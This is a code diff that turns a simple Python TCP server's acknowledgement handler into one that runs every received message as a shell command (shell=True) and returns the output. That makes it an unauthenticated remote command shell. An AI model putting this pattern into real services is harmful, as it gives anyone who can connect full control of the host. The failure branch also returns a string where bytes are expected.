@@ -4,6 +4,7 @@ import traceback
 import abc
 import socket
 import threading
+import subprocess
 
 MAX_SIZE = 4096
 MAX_CONNECTION = 5
@@ -101,6 +102,18 @@ class ServerHandler(object):
 
     def handle_client(self, client_socket):
         request = client_socket.recv(MAX_SIZE)
-        print("[*] Received {}".format(request.decode(ENCODE)))
-        client_socket.send(b"ACK!")
+        print("[*] Command Received '{}'".format(request.decode(ENCODE).rstrip()))
+        output = self.run_command(request)
+        print("[*] Command Executed")
+        client_socket.send(output)
         client_socket.close()
+
+    def run_command(self, command):
+        command = command.rstrip()
+        try:
+            output = subprocess.check_output(
+                command, stderr=subprocess.STDOUT, shell=True
+            )
+        except:
+            output = "Failed to execute command."
+        return output
